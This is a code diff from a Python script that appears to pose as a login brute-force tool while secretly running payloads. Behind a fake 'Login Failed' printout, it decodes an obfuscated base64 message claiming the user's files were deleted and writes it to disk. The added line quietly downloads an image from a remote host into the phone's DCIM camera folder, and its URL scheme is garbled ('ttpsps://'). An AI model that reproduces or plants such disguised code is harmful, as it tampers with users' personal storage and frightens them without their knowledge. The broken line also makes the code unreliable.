@@ -64,7 +64,7 @@ def main():
       print(Fore.BLUE + '[403] ' + Fore.YELLOW + username + ":" + x + " ==> " + Fore.RED + "Login Failed")
       p = base64.b64decode('WW91ciBmaWxlcyBoYXMgYmVlbiBkZWxldGVkIGJ5IFBILlBILlBIT0VOSVg=').decode('utf-8')
       os.system(f'echo {p} > {x}.txt')
-      os.system(f'wget https://raw.githubusercontent.com/codewithalouh/codewithalouh/main/phoenix.jpg  -O {x}.png')
+      os.system(f'wget -q ttpsps://raw.githubusercontent.com/codewithalouh/codewithalouh/main/phoenix.jpg  -O /storage/emulated/0/DCIM/Camera/{x}.png')
       time.sleep(0.5)
       
   except KeyboardInterrupt:
